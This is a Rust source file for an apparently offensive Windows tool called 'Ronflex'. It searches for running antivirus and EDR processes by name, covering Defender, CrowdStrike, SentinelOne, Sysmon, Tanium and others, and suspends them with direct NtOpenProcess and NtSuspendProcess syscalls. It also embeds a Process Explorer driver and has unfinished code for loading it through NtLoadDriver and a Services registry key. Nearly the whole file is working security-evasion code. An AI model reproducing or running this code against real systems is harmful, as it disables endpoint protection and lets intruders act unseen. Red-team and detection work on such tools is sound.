use colored::Colorize;
use ntapi::ntapi_base::CLIENT_ID;
use rust_syscalls::syscall;
use std::env;
use std::fs;
use std::mem::size_of;
use std::process::exit;
use sysinfo::PidExt;
use sysinfo::ProcessExt;
use sysinfo::SystemExt;
use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES};
use winapi::um::winnt::PROCESS_SUSPEND_RESUME;
use winapi::shared::ntdef::PUNICODE_STRING;
use std::include_bytes;

use std::io;
use std::path::Path;
use winreg::enums::*;
use winreg::RegKey;

fn load_driver(servicename: String) -> bool {
    //servicename = servicename as PUNICODE_STRING;
    unsafe {
        let ntstatus = syscall!(
            "NtLoadDriver",
            servicename
        );
    }
    true
}

fn create_registry_key(drivername: String, servicename: String) -> Result<(), Box<dyn std::error::Error>> {
    //let reg_path = format!("\\SYSTEM\\CurrentControlSet\\Services{}", servicename);
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
    let path = Path::new("SYSTEM").join("CurrentControlSet").join("Services");
    let (key, disp) = hkcu.create_subkey(&path)?;

    key.set_value("TestSZ", &"written by Rust")?;
    let sz_val: String = key.get_value("TestSZ")?;
    key.delete_value("TestSZ")?;
    println!("TestSZ = {}", sz_val);

    Ok(())
}

fn write_driver() -> Result<(), Box<dyn std::error::Error>> {
    let driver = include_bytes!("../resources/PROCEXP.sys");
    fs::write("PROCEXP.sys", driver)?;
    Ok(())
}



fn evil(target: &str) {
    let system = sysinfo::System::new_all();

    for p in system.processes_by_exact_name(target) {
        println!("Targeting process: {} with PID: {}", p.name(), p.pid());
        let pid: u32 = p.pid().as_u32();

        let cid: CLIENT_ID = CLIENT_ID {
            UniqueProcess: pid as _,
            UniqueThread: 0 as _,
        };

        let oa: OBJECT_ATTRIBUTES = OBJECT_ATTRIBUTES {
            Length: size_of::<OBJECT_ATTRIBUTES>() as _,
            RootDirectory: NULL,
            ObjectName: NULL as _,
            Attributes: 0,
            SecurityDescriptor: NULL,
            SecurityQualityOfService: NULL,
        };

        let mut handle: HANDLE = NULL;
        let mut ntstatus: NTSTATUS;

        unsafe {
            ntstatus = syscall!(
                "NtOpenProcess",
                &mut handle,
                PROCESS_SUSPEND_RESUME,
                &oa,
                &cid
            );

            match ntstatus {
                0 => {}
                _ => {
                    let message = format!(
                        "[-] Error accessing process: {} with PID: {}. NTSTATUS: {}. Skipping..",
                        p.name(),
                        p.pid(),
                        ntstatus
                    )
                    .red();
                    println!("{}", message);
                    continue;
                }
            };

            ntstatus = syscall!("NtSuspendProcess", handle);

            match ntstatus {
                0 => {
                    let message = format!("[+] Ronflex worked! Have a good night {}", &pid).green();
                    println!("{}", message);
                }
                _ => {
                    let message = format!("[-] Ronflex failed.. NTSTATUS: {}", ntstatus).red();
                    println!("{}", message);
                }
            }

            let _ = syscall!("NtClose", handle);
        }
    }
}

fn main() {
    // product list source https://github.com/BishopFox/sliver/blob/041ae65c61629e65646623e472d658472022d84e/client/command/processes/ps.go
    let product_list: Vec<&str> = vec![
        "ccSvcHst.exe",
        "cb.exe",
        "RepMgr.exe",
        "RepUtils.exe",
        "RepUx.exe",
        "RepWSC.exe",
        "scanhost.exe",
        "MsMpEng.exe",
        "SenseIR.exe",
        "SenseCncProxy.exe",
        "MsSense.exe",
        "MpCmdRun.exe",
        "MonitoringHost.exe",
        "HealthService.exe",
        "smartscreen.exe",
        "CSFalconService.exe",
        "CSFalconContainer.exe",
        "bdservicehost.exe",
        "bdagent.exe",
        "bdredline.exe",
        "coreServiceShell.exe",
        "ds_monitor.exe",
        "Notifier.exe",
        "dsa.exe",
        "ds_nuagent.exe",
        "coreFrameworkHost.exe",
        "SentinelServiceHost.exe",
        "SentinelStaticEngine.exe",
        "SentinelStaticEngineScanner.exe",
        "SentinelAgent.exe",
        "SentinelAgentWorker.exe",
        "SentinelHelperService.exe",
        "SentinelBrowserNativeHost.exe",
        "SentinelUI.exe",
        "Sysmon.exe",
        "Sysmon64.exe",
        "CylanceSvc.exe",
        "CylanceUI.exe",
        "TaniumClient.exe",
        "TaniumCX.exe",
        "TaniumDetectEngine.exe",
    ];

    let args: Vec<String> = env::args().collect();

    println!("Run this tool as SYSTEM for maximum effect");

    //let res = write_driver();
    //dbg!("{}",res);

    let res = create_registry_key("Drivername".to_string(), "Servicename".to_string());
    dbg!("{}",res);
    exit(0);

    if args.len() == 2 {
        println!(
            "[+] Executing tool in custom target mode. Targeting {} process",
            &args[1]
        );
        let target = &args[1];
        evil(target);
    } else {
        println!("[+] Starting. Attempting to clean your system from nasty AV/EDR solutions..");
        for target in product_list {
            evil(target);
        }
    }
}
